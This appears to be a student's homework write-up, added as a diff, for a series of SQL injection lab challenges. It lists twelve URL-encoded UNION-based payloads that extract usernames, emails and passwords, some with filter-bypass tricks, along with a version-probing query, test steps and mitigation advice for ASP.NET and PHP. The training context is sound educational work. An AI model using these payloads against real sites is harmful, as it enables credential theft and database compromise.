@@ -1,0 +1,52 @@
+Scott Kinder, SQLi, 5/7/2015
+Vulns:
+1. http://sqli-challenges.r7.io/kinders/1/?user_input=%27+UNION+SELECT+username%2C+email%2C+password+FROM+users+--
+2. http://sqli-challenges.r7.io/kinders/2/?user_name=%27+UNION+SELECT+username%2C+password%2C+email+FROM+users+--&password=
+3. http://sqli-challenges.r7.io/kinders/3/?user_input=jim%27+AND+password%3D%27wrongpass%27+OR+username+LIKE+%27%25flag%25   CREDIT: Drew Khaw for nudging me in the right direction for optimized query
+4. http://sqli-challenges.r7.io/kinders/4/?user_input=%27+UNION+SELECT+username%2C+password%2C+NULL%2C+NULL+FROM+users+--
+5. http://sqli-challenges.r7.io/kinders/5/?user_input=%27+UNION+SELECT+username%2C+email%2C+password%2C+NULL%2C+NULL+FROM+users+--
+6. http://sqli-challenges.r7.io/kinders/6/?user_input=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+username%7C%7C%27%3A%27%7C%7Cpassword%2C+NULL+FROM+users+--
+7. http://sqli-challenges.r7.io/kinders/7/?user_input=%27+UNION+SELECT+username%7C%7C%27%3A%27%7C%7Cpassword+FROM+users+--
+8. http://sqli-challenges.r7.io/kinders/8/?user_input=%27+UNION+SELECT+%270%27%2C+username%7C%7C%27%3A%27%7C%7Cpassword+FROM+users+--
+9. http://sqli-challenges.r7.io/kinders/9/?user_input=%27+UNION+SeLECT+NULL%2C+username%2C+password%2C+NULL%2C+NULL+FROM+users+--
+10. http://sqli-challenges.r7.io/kinders/10/?user_input=%27+UNION%2F*a*%2FSELECT%2F*a*%2FNULL%2C%2F*a*%2Fusername%2C%2F*a*%2Fpassword%2C%2F*a*%2FNULL%2C%2F*a*%2FNULL%2F*a*%2FFROM%2F*a*%2Fusers+--
+11. http://sqli-challenges.r7.io/kinders/11/?user_input=%27+UNION+SELECT+%270%27%2C+username%2C+password%2C+NULL%2C+NULL+FROM+supersecretuserstable+%2F*
+12. http://sqli-challenges.r7.io/kinders/12/?user_input=%27+UNION+SELECT+NULL%2C+username%2C+password%2C+NULL+FROM+othersupersecretuserstablothersupersecretuserstablee+--    CREDIT: Drew Khaw for reminding me of old XSS filter bypass techniques.
+
+Version Query: http://sqli-challenges.r7.io/kinders/1/?user_input=%27+UNION+SELECT+sqlite_version%28%29%2C+NULL%2C+NULL+--
+Version number: sqlite version 3.7.9
+Optimized query in #3
+
+Description:
+SQL injection is where a query to the database is vulnerable to users
+injecting whatever query they want. This can be extremely bad because
+it will expose everything in the database, not just a single table.
+In some cases, the attacker can take over the entire server and get a shell
+just because of a simple SQLi vuln in a certain query box.
+
+Test Steps:
+1. First check to see if its vulnerable by typing in a " ' " (single tick).
+Then, try to get a valid query to work by either guessing or deducing all of the
+rows in the initial query, and putting in NULLs for the field. Then, try to
+get the information you need from the table you desire.
+2. Challenge 12 was a two part challenge. First, you have to figure out
+the name of the "secret" table. We do this by querying the master schema
+of the DB, which then tells us all of the tables in the DB. Then, its
+obvious that it was "othersupersecretuserstable", so we know we need to inject
+into that. Seeing it gets filtered, we do a simple bypass like we did
+on the XSS homework by doing the thing like "selselectect".
+
+Mitigations:
+ASP.NET: Microsoft's official web page on SQLi prevention in ASP.NET gives a 3
+step approach for prevention. First, you should constrain input. You can
+do that with a regular expression, and is important against second order SQL injection
+as well. Second, and similar to PHP, you need to use parameterized input with stored
+procedures. That way, things like single ticks will always be escaped. On top of that,
+you should use a least-priviledged database account, and also avoid
+disclosing errors on live website.
+
+PHP: First, never connect to the DB as a admin/superuser, only connect
+as a user with the needed priviledges. Second, always use parameterized statements, which
+a method is available for all forms of DB connections. Lastly, one should
+verify the types of data are the ones you expect, ie. if you expect an
+int, verify its an int.
